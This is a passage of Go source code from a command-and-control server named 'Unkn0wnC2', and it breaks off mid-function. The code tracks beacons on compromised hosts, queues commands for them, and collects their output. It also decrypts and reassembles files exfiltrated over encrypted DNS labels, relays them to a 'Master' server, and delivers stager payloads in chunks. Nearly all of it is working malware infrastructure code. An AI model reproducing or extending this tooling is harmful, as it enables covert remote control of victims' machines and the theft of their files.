// Package main implements the C2 management functionality for the Unkn0wnC2 server.
// This file handles beacon registration, task queuing, result collection, and
// the core C2 protocol logic including chunked data transmission.
package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

// generateDeterministicSessionID creates a consistent session ID from stagerIP + clientBinaryID
// This ensures all DNS servers generate the same session ID for the same stager
func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
	hash := sha256.Sum256([]byte(data))
	hashHex := hex.EncodeToString(hash[:])
	return fmt.Sprintf("stg_%s", hashHex[:4])
}

// Constants are now defined in constants.go

// Beacon represents a connected beacon client
type Beacon struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	Username    string    `json:"username"`
	OS          string    `json:"os"`
	Arch        string    `json:"arch"`
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	IPAddress   string    `json:"ip_address"`
	TaskQueue   []Task    `json:"-"`
	CurrentTask string    `json:"-"`
}

// Task represents a command task for a beacon
type Task struct {
	ID        string     `json:"id"`
	BeaconID  string     `json:"beacon_id"`
	Command   string     `json:"command"`
	Status    string     `json:"status"` // "pending", "sent", "completed", "failed"
	CreatedAt time.Time  `json:"created_at"`
	SentAt    *time.Time `json:"sent_at,omitempty"`
	Result    string     `json:"result,omitempty"`
}

// ResultChunk represents a piece of a multi-part result
type ResultChunk struct {
	BeaconID    string
	TaskID      string
	ChunkIndex  int
	TotalChunks int
	Data        string
	ReceivedAt  time.Time
}

// ExpectedResult tracks metadata for incoming chunked results
type ExpectedResult struct {
	BeaconID       string
	TaskID         string
	TotalSize      int
	TotalChunks    int
	ReceivedAt     time.Time
	ReceivedData   []string // Store chunks in order
	LastChunkIndex int      // Track last chunk received for progress calculation
}

// ExfilSession tracks per-session metadata for dedicated exfil client uploads
type ExfilSession struct {
	SessionID      string
	JobID          string
	FileName       string
	FileSize       uint64
	TotalChunks    uint32
	ReceivedCount  int
	ReceivedChunks map[uint32]bool
	PendingChunks  map[uint32][]byte
	Status         string
	ClientIP       string
	Note           string
	CreatedAt      time.Time
	LastActivity   time.Time
	LastChunkAt    time.Time
}

// ExfilTagTracker keeps state for label-encoded exfil frames that reference session tags.
type ExfilTagTracker struct {
	Tag          string
	SessionID    uint32
	JobID        uint32
	TotalFrames  uint32
	TotalChunks  uint32
	CreatedAt    time.Time
	LastActivity time.Time
}

type metadataAssembler struct {
	segments   map[uint32][]byte
	finalIndex *uint32
}

type pendingLabelChunk struct {
	payload  string
	counter  uint32
	flags    uint8
	clientIP string
}

// StagerSession tracks a stager deployment session
type StagerSession struct {
	ClientIP           string
	ClientBinaryID     string // Binary ID from Master
	SessionID          string // Session ID for tracking
	OS                 string
	Arch               string
	Chunks             []string // Base64-encoded chunks
	TotalChunks        int
	DeliveredCount     int // Number of chunks delivered
	LastChunkDelivered int // Last chunk index delivered
	CreatedAt          time.Time
	LastActivity       time.Time // Updated on each chunk request to prevent premature expiration
	StartedAt          time.Time // When first chunk was requested
	LastChunk          *int      // Last chunk index sent (pointer to differentiate nil from 0)
	ProgressRunning    bool      // Track if progress updater is running
	ProgressDone       chan bool // Signal to stop progress updater
	ProgressCompleted  bool      // Track if completion message was printed (avoid spam)
}

// C2Manager handles beacon management and tasking
type C2Manager struct {
	beacons              map[string]*Beacon
	tasks                map[string]*Task
	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
	exfilSessions        map[string]*ExfilSession        // key: session hex string
	exfilTagIndex        map[string]*ExfilTagTracker     // key: normalized session tag
	stagerSessions       map[string]*StagerSession       // key: clientIP
	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
	completedStagerLogs  map[string]bool                 // key: sessionID, value: true if completion logged (prevents spam)
	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
	knownDomains         []string                        // Active DNS domains from Master (for first check-in)
	db                   *Database                       // Database for persistent storage
	resultBatchBuffer    map[string][]ResultChunk        // key: taskID, value: buffered chunks for batching
	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
	pendingLabelChunks   map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
	tasksInProgress      map[string]time.Time            // key: taskID, value: first chunk received time (prevents re-delivery)
	mutex                sync.RWMutex
	taskCounter          int // Counter for local tasks (standalone mode)
	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
	debug                bool
	aesKey               []byte
	jitterConfig         StagerJitter // Stager timing configuration
	domain               string       // The domain this server is authoritative for
}

// CachedStagerSession tracks stager sessions created from cached data (no Master roundtrip)
type CachedStagerSession struct {
	SessionID       string
	MasterSessionID string // Session ID assigned by Master for UI tracking
	ClientBinaryID  string
	StagerIP        string
	TotalChunks     int
	ChunksServed    int
	SHA256Checksum  string // Checksum of original binary for verification
	CreatedAt       time.Time
	LastActivity    time.Time
}

// NewC2Manager creates a new C2 management instance with the specified configuration.
// It initializes the beacon tracking system, task management, sets up AES encryption,
// and initializes the database for persistent storage.
func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, dbPath string, domain string) *C2Manager {
	aesKey := generateAESKey(encryptionKey)

	// Initialize database
	db, err := NewDatabase(dbPath)
	if err != nil {
		logf("[DB] WARNING: Failed to initialize database: %v", err)
		logf("[DB] Running in memory-only mode (data will not persist)")
		db = nil
	}

	c2 := &C2Manager{
		beacons:              make(map[string]*Beacon),
		submittedData:        make(map[string]bool),
		tasks:                make(map[string]*Task),
		masterTaskIDs:        make(map[string]string),
		resultChunks:         make(map[string][]ResultChunk),
		expectedResults:      make(map[string]*ExpectedResult),
		exfilSessions:        make(map[string]*ExfilSession),
		exfilTagIndex:        make(map[string]*ExfilTagTracker),
		metadataAssemblers:   make(map[string]*metadataAssembler),
		pendingLabelChunks:   make(map[string][]pendingLabelChunk),
		stagerSessions:       make(map[string]*StagerSession),
		cachedStagerSessions: make(map[string]*CachedStagerSession),
		completedStagerLogs:  make(map[string]bool),
		recentMessages:       make(map[string]time.Time),
		resultBatchBuffer:    make(map[string][]ResultChunk),
		resultBatchTimer:     make(map[string]*time.Timer),
		tasksInProgress:      make(map[string]time.Time),
		db:                   db,
		taskCounter:          TaskCounterStart,
		domainTaskCounter:    DomainTaskCounterStart,
		debug:                debug,
		aesKey:               aesKey,
		jitterConfig:         jitterConfig,
		domain:               strings.ToLower(domain),
	}

	// Load existing beacons from database
	if c2.db != nil {
		if err := c2.loadBeaconsFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load beacons from database: %v", err)
		}
		// Load existing tasks from database
		if err := c2.loadTasksFromDB(); err != nil {
			logf("[DB] WARNING: Failed to load tasks from database: %v", err)
		}
	}

	// Start cleanup goroutine
	go c2.cleanupExpiredSessions()

	// Start pending exfil chunk retry goroutine
	go c2.retryPendingExfilChunks()

	// Start periodic database sync
	if c2.db != nil {
		go c2.periodicDBCleanup()
	}

	return c2
}

// loadBeaconsFromDB loads existing beacons from the database into memory
func (c2 *C2Manager) loadBeaconsFromDB() error {
	beacons, err := c2.db.GetAllBeacons()
	if err != nil {
		return fmt.Errorf("failed to load beacons: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	for _, beacon := range beacons {
		c2.beacons[beacon.ID] = beacon
		logf("[DB] Loaded beacon from database: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
	}

	if len(beacons) > 0 {
		logf("[DB] Loaded %d beacon(s) from database", len(beacons))
	}

	return nil
}

// loadTasksFromDB loads existing tasks from the database into memory
func (c2 *C2Manager) loadTasksFromDB() error {
	tasks, err := c2.db.GetAllTasks()
	if err != nil {
		return fmt.Errorf("failed to load tasks: %w", err)
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Load tasks and populate beacon task queues
	for _, task := range tasks {
		c2.tasks[task.ID] = task

		// Update task counter to avoid ID collisions
		if strings.HasPrefix(task.ID, "T") {
			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.taskCounter {
				c2.taskCounter = id + 1
			}
			// SHADOW MESH FIX: Populate masterTaskIDs for loaded master tasks
			// Since we now use master task IDs directly, task.ID IS the master ID
			c2.masterTaskIDs[task.ID] = task.ID
		} else if strings.HasPrefix(task.ID, "D") {
			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.domainTaskCounter {
				c2.domainTaskCounter = id + 1
			}
			// Note: D-prefix tasks are domain updates (local only, not forwarded to Master)
		}

		// Add pending tasks to beacon queues
		if task.Status == "pending" {
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.TaskQueue = append(beacon.TaskQueue, *task)
			}
		} else if task.Status == "sent" {
			// Restore "sent" tasks as current task (beacon may have crashed before completing)
			if beacon, exists := c2.beacons[task.BeaconID]; exists {
				beacon.CurrentTask = task.ID
			}
		}
	}

	if len(tasks) > 0 {
		logf("[DB] Loaded %d task(s) from database", len(tasks))
	}

	return nil
}

// periodicDBCleanup performs periodic database maintenance
func (c2 *C2Manager) periodicDBCleanup() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()

	for range ticker.C {
		if c2.db == nil {
			return
		}

		// Clean up old completed tasks (older than 30 days by default)
		if err := c2.db.CleanupOldData(30); err != nil {
			if c2.debug {
				logf("[DB] Database cleanup error: %v", err)
			}
		}

		// Log database stats in debug mode
		if c2.debug {
			if stats, err := c2.db.GetDatabaseStats(); err == nil {
				logf("[DB] DB Stats: %d beacons, %d active, %d tasks",
					stats["beacons"], stats["active_beacons"], stats["tasks"])
			}
		}
	}
}

// calculateStagerETA calculates ETA using overall transfer rate (including pauses)
// Returns a human-readable duration string (e.g., "2m 30s", "45s", "2d 5h")
func calculateStagerETA(session *StagerSession, currentChunk int) string {
	if currentChunk >= session.TotalChunks {
		return "complete"
	}

	// Need at least one chunk to calculate
	if currentChunk < 1 || session.StartedAt.IsZero() {
		return "calculating..."
	}

	chunksRemaining := session.TotalChunks - currentChunk

	// ALWAYS use overall average rate including ALL elapsed time (pauses + transfers)
	// This is the only way to get accurate ETA for operations with jitter pauses
	elapsed := time.Since(session.StartedAt).Seconds()
	overallRate := elapsed / float64(currentChunk) // seconds per chunk (includes everything)

	// Estimate remaining time: seconds_per_chunk * chunks_remaining
	estimatedSecondsRemaining := overallRate * float64(chunksRemaining)

	duration := time.Duration(estimatedSecondsRemaining) * time.Second

	// Format as human-readable string with support for days
	if duration < time.Minute {
		return fmt.Sprintf("%ds", int(duration.Seconds()))
	} else if duration < time.Hour {
		minutes := int(duration.Minutes())
		seconds := int(duration.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else if duration < 24*time.Hour {
		hours := int(duration.Hours())
		minutes := int(duration.Minutes()) % 60
		if minutes > 0 {
			return fmt.Sprintf("%dh %dm", hours, minutes)
		}
		return fmt.Sprintf("%dh", hours)
	} else {
		// Days and hours for long transfers
		days := int(duration.Hours()) / 24
		hours := int(duration.Hours()) % 24
		if hours > 0 {
			return fmt.Sprintf("%dd %dh", days, hours)
		}
		return fmt.Sprintf("%dd", days)
	}
}

// renderProgressBar creates a visual progress bar for stager downloads
// Returns a formatted string with progress bar, percentage, and ETA
//
//nolint:unused // Used by logStagerProgress
func renderProgressBar(current, total int, eta string, clientIP string) string {
	if total == 0 {
		return ""
	}

	percentage := float64(current) / float64(total) * 100
	barWidth := 40
	filled := int(float64(barWidth) * float64(current) / float64(total))

	// Build progress bar
	bar := "["
	for i := 0; i < barWidth; i++ {
		if i < filled {
			bar += "="
		} else if i == filled && filled < barWidth {
			bar += ">"
		} else {
			bar += " "
		}
	}
	bar += "]"

	// Format: [=========>           ] 25% (10/40 chunks) ETA: 2m 30s - 192.168.1.100
	return fmt.Sprintf("\r[Stager] %s %.1f%% (%d/%d chunks) ETA: %s - %s",
		bar, percentage, current, total, eta, clientIP)
}

// startProgressUpdater starts a goroutine that continuously updates the progress bar
// Caller must NOT hold c2.mutex when calling this function.
func (c2 *C2Manager) startProgressUpdater(session *StagerSession, clientIP string) {
	c2.mutex.Lock()
	if session.ProgressRunning {
		c2.mutex.Unlock()
		return // Already running
	}

	session.ProgressRunning = true
	session.ProgressDone = make(chan bool)
	c2.mutex.Unlock()

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-session.ProgressDone:
				return
			case <-ticker.C:
				c2.mutex.RLock()
				if session.LastChunk == nil {
					c2.mutex.RUnlock()
					continue
				}
				current := *session.LastChunk + 1
				if current >= session.TotalChunks {
					c2.mutex.RUnlock()
					return
				}

				eta := calculateStagerETA(session, current)
				progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
				fmt.Print(progressBar)
				c2.mutex.RUnlock()
			}
		}
	}()
}

// stopProgressUpdater stops the progress updater goroutine
// Caller must hold c2.mutex when calling this function.
func (c2 *C2Manager) stopProgressUpdater(session *StagerSession) {
	if session.ProgressRunning && session.ProgressDone != nil {
		close(session.ProgressDone)
		session.ProgressRunning = false
	}
}

// logStagerProgress displays or updates the progress bar for stager downloads
func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
	// Skip if completion message was already printed for this session ID
	c2.mutex.RLock()
	if c2.completedStagerLogs[session.SessionID] || session.ProgressCompleted {
		c2.mutex.RUnlock()
		return
	}
	c2.mutex.RUnlock()

	current := chunkIndex + 1
	eta := calculateStagerETA(session, current)

	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)

	// If this is the first chunk, print on new line and start progress updater
	if chunkIndex == 0 {
		fmt.Print("\n" + progressBar)
		c2.startProgressUpdater(session, clientIP)
	} else if current >= session.TotalChunks {
		// Final chunk - stop updater and print completion
		c2.mutex.Lock()
		c2.stopProgressUpdater(session)
		session.ProgressCompleted = true
		c2.completedStagerLogs[session.SessionID] = true // Mark session ID as complete globally
		c2.mutex.Unlock()
		elapsed := time.Since(session.StartedAt)
		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
			formatDuration(elapsed), clientIP)
	} else {
		// Chunk received - the updater will continue showing progress
		fmt.Print(progressBar)
	}
}

// formatDuration formats a duration into human-readable format
//
//nolint:unused // Used by logStagerProgress
func formatDuration(d time.Duration) string {
	if d < time.Minute {
		return fmt.Sprintf("%ds", int(d.Seconds()))
	} else if d < time.Hour {
		minutes := int(d.Minutes())
		seconds := int(d.Seconds()) % 60
		if seconds > 0 {
			return fmt.Sprintf("%dm %ds", minutes, seconds)
		}
		return fmt.Sprintf("%dm", minutes)
	} else {
		hours := int(d.Hours())
		minutes := int(d.Minutes()) % 60
		return fmt.Sprintf("%dh %dm", hours, minutes)
	}
}

// cleanupExpiredSessions periodically removes expired stager sessions and expected results
func (c2 *C2Manager) cleanupExpiredSessions() {
	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()

		// Clean up old message hashes (keep only last 5 minutes)
		c2.mutex.Lock()
		expiredCount := 0
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > 5*time.Minute {
				delete(c2.recentMessages, msgHash)
				expiredCount++
			}
		}
		c2.mutex.Unlock()
		if c2.debug && expiredCount > 0 {
			logf("[C2] Cleaned up %d expired message hashes", expiredCount)
		}

		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
		c2.mutex.Lock()
		var expiredSessionIPs []string
		for ip, session := range c2.stagerSessions {
			if now.Sub(session.LastActivity) > StagerSessionTimeout {
				expiredSessionIPs = append(expiredSessionIPs, ip)
			}
		}
		c2.mutex.Unlock()

		// Now safely stop progress updaters and delete sessions (outside lock)
		for _, ip := range expiredSessionIPs {
			c2.mutex.Lock()
			if session, exists := c2.stagerSessions[ip]; exists {
				c2.stopProgressUpdater(session)
				delete(c2.stagerSessions, ip)
				if c2.debug {
					logf("[C2] Cleaned up expired stager session for %s (inactive for %v)", ip, now.Sub(session.LastActivity))
				}
			}
			c2.mutex.Unlock()
		}

		// Clean up exfil sessions that have gone quiet
		type expiredExfil struct {
			id   string
			idle time.Duration
		}
		c2.mutex.Lock()
		var expiredExfilSessions []expiredExfil
		for sessionID, session := range c2.exfilSessions {
			if idle := now.Sub(session.LastActivity); idle > ExfilSessionTimeout {
				expiredExfilSessions = append(expiredExfilSessions, expiredExfil{id: sessionID, idle: idle})
				delete(c2.exfilSessions, sessionID)
			}
		}
		for tag, tracker := range c2.exfilTagIndex {
			if now.Sub(tracker.LastActivity) > ExfilSessionTimeout {
				delete(c2.exfilTagIndex, tag)
				// Also clean up any pending chunks for this tag (memory leak fix)
				delete(c2.pendingLabelChunks, normalizeExfilTag(tag))
			}
		}
		c2.mutex.Unlock()
		for _, expired := range expiredExfilSessions {
			if c2.debug {
				logf("[Exfil] Cleaned up inactive session %s (idle %v)", expired.id, expired.idle)
			}
			if c2.db != nil {
				go func(id string) {
					if err := c2.db.UpdateExfilSessionStatus(id, "timeout"); err != nil && c2.debug {
						logf("[Exfil] Failed to mark session %s timed out: %v", id, err)
					}
				}(expired.id)
			}
		}

		// Clean up expired expected results, but save partial results first
		// Collect expired results first (with lock)
		type expiredResult struct {
			taskID      string
			beaconID    string
			data        []string
			recvCount   int
			totalChunks int
		}
		var expiredResults []expiredResult

		c2.mutex.Lock()
		for taskID, expected := range c2.expectedResults {
			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
				// Count received chunks
				receivedCount := 0
				for i := 0; i < expected.TotalChunks; i++ {
					if expected.ReceivedData[i] != "" {
						receivedCount++
					}
				}

				// Collect data for processing outside lock
				if receivedCount > 0 {
					expiredResults = append(expiredResults, expiredResult{
						taskID:      taskID,
						beaconID:    expected.BeaconID,
						data:        expected.ReceivedData,
						recvCount:   receivedCount,
						totalChunks: expected.TotalChunks,
					})
				}

				delete(c2.expectedResults, taskID)
			}
		}

		// Clean up recent message hashes older than RecentMessageTTL
		for msgHash, timestamp := range c2.recentMessages {
			if now.Sub(timestamp) > RecentMessageTTL {
				delete(c2.recentMessages, msgHash)
			}
		}

		// Clean up old in-progress task entries (tasks that never completed)
		// Keep entries for 30 minutes to handle long-running commands
		inProgressCleanupCount := 0
		for taskID, startTime := range c2.tasksInProgress {
			if now.Sub(startTime) > 30*time.Minute {
				delete(c2.tasksInProgress, taskID)
				inProgressCleanupCount++
			}
		}

		// Clean up masterTaskIDs for completed/failed tasks (memory leak fix)
		// Only clean up tasks that are completed/failed AND older than 1 hour
		masterTaskCleanupCount := 0
		for taskID := range c2.masterTaskIDs {
			if task, exists := c2.tasks[taskID]; exists {
				if (task.Status == "completed" || task.Status == "failed" || task.Status == "partial") &&
					now.Sub(task.CreatedAt) > 1*time.Hour {
					delete(c2.masterTaskIDs, taskID)
					masterTaskCleanupCount++
				}
			} else {
				// Task doesn't exist anymore, clean up the mapping
				delete(c2.masterTaskIDs, taskID)
				masterTaskCleanupCount++
			}
		}
		c2.mutex.Unlock()

		if c2.debug && inProgressCleanupCount > 0 {
			logf("[C2] Cleaned up %d stale in-progress task entries", inProgressCleanupCount)
		}

		// Process expired results outside the lock
		for _, expired := range expiredResults {
			partialResult := strings.Join(expired.data, "")
			logf("[C2] Task %s timed out with %d/%d chunks - saving partial result (%d bytes)",
				expired.taskID, expired.recvCount, expired.totalChunks, len(partialResult))

			// Update task status and save partial result
			c2.mutex.Lock()
			if task, exists := c2.tasks[expired.taskID]; exists {
				task.Result = partialResult
				task.Status = "partial"
			}
			c2.mutex.Unlock()

			// Save to database asynchronously (outside lock)
			if c2.db != nil {
				go func(tid, bid, res string) {
					if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
						logf("[C2] Failed to save partial result: %v", err)
					}
					// Mark as partial in database
					if err := c2.db.UpdateTaskStatus(tid, "partial"); err != nil && c2.debug {
						logf("[C2] Failed to update task status: %v", err)
					}
				}(expired.taskID, expired.beaconID, partialResult)
			}
		}
	}
}

// GetEncryptionKey returns the AES encryption key for external use
func (c2 *C2Manager) GetEncryptionKey() []byte {
	return c2.aesKey
}

// isPrintableASCII checks if a string contains only printable ASCII characters
// Used to validate that decrypted data is likely valid C2 traffic
func isPrintableASCII(s string) bool {
	for _, r := range s {
		// Allow printable ASCII (space to ~) plus newlines/tabs
		if r < 32 && r != 9 && r != 10 && r != 13 || r > 126 {
			return false
		}
	}
	return true
}

// decodeBeaconData decodes and decrypts beacon data using AES-GCM + base36
func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
	// Remove dots from DNS labels (e.g., "abc.def" -> "abcdef")
	// This handles long subdomains that get split into multiple labels
	encoded = strings.ReplaceAll(encoded, ".", "")

	// Use new base36 + AES-GCM decoding
	decoded, err := decodeAndDecrypt(encoded, c2.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt: %v", err)
	}

	return decoded, nil
}

// ProcessExfilFrame consumes a label-encoded exfil frame emitted by the dedicated client.
func (c2 *C2Manager) ProcessExfilFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	if frame == nil {
		return false, fmt.Errorf("nil exfil frame")
	}

	switch frame.Phase {
	case ExfilFrameInit:
		c2.recordExfilInit(frame.SessionTag, frame.Counter)
		return true, nil
	case ExfilFrameChunk:
		if frame.Payload == "" {
			return false, fmt.Errorf("chunk frame missing payload")
		}
		if frame.Flags&FrameEnvelopeFlagMetadata != 0 {
			return c2.handleExfilMetadataFrame(frame, clientIP)
		}
		if frame.Counter == 0 && c2.debug {
			logf("[Exfil] chunk counter 0 without metadata flag")
		}
		return c2.handleExfilDataFrame(frame, clientIP)
	case ExfilFrameComplete:
		return c2.handleExfilCompletionFrame(frame.SessionTag)
	default:
		return false, fmt.Errorf("unknown exfil frame phase: %v", frame.Phase)
	}
}

func (c2 *C2Manager) recordExfilInit(tag string, totalFrames uint32) {
	now := time.Now()
	c2.mutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(tag, now)
	tracker.TotalFrames = totalFrames
	// NOTE: Do NOT attempt to calculate TotalChunks from TotalFrames here.
	// TotalFrames includes metadata frames (which can be >1), so the calculation
	// would be inaccurate. TotalChunks should only be set from the metadata payload
	// in handleExfilMetadataFrame, which parses the actual value from the client.
	c2.mutex.Unlock()
}

func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	segment, err := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
	if err != nil {
		return false, fmt.Errorf("exfil metadata decrypt failed: %w", err)
	}

	isFinal := (frame.Flags & FrameEnvelopeFlagFinal) != 0
	assembled, complete := c2.appendMetadataSegment(frame.SessionTag, frame.Counter, segment, isFinal)
	if !complete {
		return true, nil
	}

	meta, err := parseExfilMetadataPayload(assembled)
	if err != nil {
		return false, fmt.Errorf("exfil metadata parse failed: %w", err)
	}
	meta.PayloadLen = uint16(len(assembled))

	now := time.Now()
	c2.mutex.Lock()
	tracker := c2.ensureExfilTagTrackerLocked(frame.SessionTag, now)
	tracker.SessionID = meta.SessionID
	tracker.JobID = meta.JobID
	if meta.TotalChunks != 0 {
		tracker.TotalChunks = meta.TotalChunks
		// NOTE: Do NOT recalculate TotalFrames here. The init frame provides the
		// accurate TotalFrames count (which includes metadata frames). Calculating
		// TotalFrames = TotalChunks + 1 would be wrong for multi-segment metadata.
	}
	c2.mutex.Unlock()

	// Register tag with Master for distributed exfil
	if masterClient != nil {
		sessionIDStr := fmt.Sprintf("%08x", meta.SessionID)
		go func(tag, sid string) {
			if err := masterClient.RegisterExfilTag(tag, sid); err != nil && c2.debug {
				logf("[Exfil] Failed to register tag %s with Master: %v", tag, err)
			}
		}(frame.SessionTag, sessionIDStr)
	}

	ack, err := c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
	if err == nil {
		c2.flushPendingLabelChunks(frame.SessionTag)
	}
	return ack, err
}

func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
	tracker, ok := c2.getExfilTagTracker(frame.SessionTag)
	if !ok || tracker.SessionID == 0 {
		// Try to submit by tag if we don't know the session (distributed mode)
		if masterClient != nil {
			// Decrypt payload first (Master expects Base64-encoded plaintext)
			plaintext, decryptErr := decodeAndDecryptBytes(frame.Payload, c2.aesKey)
			if decryptErr == nil {
				payloadB64 := base64.StdEncoding.EncodeToString(plaintext)

				// Try to forward to Master - if tag isn't registered yet, buffer for retry
				completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), payloadB64)
				if err == nil {
					if c2.debug {
						logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
					}
					if completed && c2.debug {
						logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
					}
					return true, nil
				}

				// If Master rejected (tag not found), buffer the chunk for retry
				// Don't create local sessions with tag_ prefix - this causes duplicate UI entries
				if c2.debug {
					logf("[Exfil] Master rejected orphan chunk tag=%s idx=%d: %v - buffering for retry", frame.SessionTag, frame.Counter, err)
				}
			} else if c2.debug {
				logf("[Exfil] Failed to decrypt orphan chunk tag=%s: %v - buffering", frame.SessionTag, decryptErr)
			}
		}

		// Buffer the chunk - it will be processed when metadata arrives
		c2.enqueuePendingLabelChunk(frame, clientIP)
		if c2.debug {
			logf("[Exfil] buffered frame tag=%s idx=%d awaiting metadata", frame.SessionTag, frame.Counter)
		}
		return true, nil
	}

	meta := c2.buildMetadataFromTracker(tracker, frame.Counter, frame.Flags)
	return c2.handleExfilChunk(frame.Payload, meta, clientIP, nil)
}

func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
	tracker, ok := c2.getExfilTagTracker(tag)
	if !ok || tracker.SessionID == 0 {
		// If we don't know the session, forward the completion tag to Master
		if masterClient != nil {
			if err := masterClient.MarkExfilCompleteByTag(tag); err == nil {
				if c2.debug {
					logf("[Exfil] Forwarded completion tag=%s to Master (unknown session locally)", tag)
				}
				return true, nil
			} else if c2.debug {
				logf("[Exfil] Failed to forward completion tag=%s: %v", tag, err)
			}
		}
		return false, fmt.Errorf("unknown exfil session for completion")
	}

	sessionID := fmt.Sprintf("%08x", tracker.SessionID)

	// Get session details for completion request
	// Try both exfilSessions (has full metadata) and tracker (has TotalChunks from init frame)
	c2.mutex.RLock()
	session, exists := c2.exfilSessions[sessionID]
	var totalChunks int
	var fileName string
	var fileSize int64
	if exists {
		totalChunks = int(session.TotalChunks)
		fileName = session.FileName
		fileSize = int64(session.FileSize)
	}
	// Fallback to tracker's TotalChunks if session doesn't have it
	if totalChunks == 0 && tracker.TotalChunks > 0 {
		totalChunks = int(tracker.TotalChunks)
	}
	c2.mutex.RUnlock()

	// Flush any unsynced chunks for this session before sending completion
	if c2.db != nil && masterClient != nil {
		c2.syncSessionChunksToMaster(sessionID, totalChunks)
	}

	// Forward completion to Master with full details - Master handles assembly
	if masterClient != nil {
		req := ExfilCompleteRequest{
			SessionID:   sessionID,
			TotalChunks: totalChunks,
			FileName:    fileName,
			FileSize:    fileSize,
		}
		if err := masterClient.MarkExfilComplete(req); err != nil {
			if c2.debug {
				logf("[Exfil] Failed to forward completion for session=%s: %v", sessionID, err)
			}
			// Try by tag as fallback
			masterClient.MarkExfilCompleteByTag(tag)
		} else if c2.debug {
			logf("[Exfil] Forwarded completion for session=%s (totalChunks=%d) to Master", sessionID, totalChunks)
		}
	}

	c2.deleteExfilTagTracker(tag)
	return true, nil
}

func (c2 *C2Manager) ensureExfilTagTrackerLocked(tag string, now time.Time) *ExfilTagTracker {
	normalized := normalizeExfilTag(tag)
	tracker, exists := c2.exfilTagIndex[normalized]
	if !exists {
		tracker = &ExfilTagTracker{
			Tag:          normalized,
			CreatedAt:    now,
			LastActivity: now,
		}
		c2.exfilTagIndex[normalized] = tracker
	} else {
		tracker.LastActivity = now
	}
	return tracker
}

func (c2 *C2Manager) getExfilTagTracker(tag string) (*ExfilTagTracker, bool) {
	normalized := normalizeExfilTag(tag)
	c2.mutex.Lock()
	defer c2.mutex.Unlock()
	tracker, exists := c2.exfilTagIndex[normalized]
	if !exists {
		return nil, false
	}
	tracker.LastActivity = time.Now()
	copyTracker := *tracker
	return &copyTracker, true
}

func (c2 *C2Manager) deleteExfilTagTracker(tag string) {
	c2.mutex.Lock()
	normalized := normalizeExfilTag(tag)
	delete(c2.exfilTagIndex, normalized)
	delete(c2.metadataAssemblers, normalized)
	delete(c2.pendingLabelChunks, normalized)
	c2.mutex.Unlock()
}

func normalizeExfilTag(tag string) string {
	return strings.ToUpper(tag)
}

func (m *metadataAssembler) addSegment(index uint32, segment []byte, isFinal bool) ([]byte, bool) {
	if m.segments == nil {
		m.segments = make(map[uint32][]byte)
	}
	if _, exists := m.segments[index]; !exists {
		m.segments[index] = append([]byte(nil), segment...)
	}
	if isFinal {
		idx := index
		m.finalIndex = &idx
	}
	if m.finalIndex == nil {
		return nil, false
	}
	finalIdx := *m.finalIndex
	var buf bytes.Buffer
	for i := uint32(0); i <= finalIdx; i++ {
		chunk, ok := m.segments[i]
		if !ok {
			return nil, false
		}
		buf.Write(chunk)
	}
	return buf.Bytes(), true
}

func (c2 *C2Manager) appendMetadataSegment(tag string, index uint32, segment []byte, isFinal bool) ([]byte, bool) {
	normalized := normalizeExfilTag(tag)
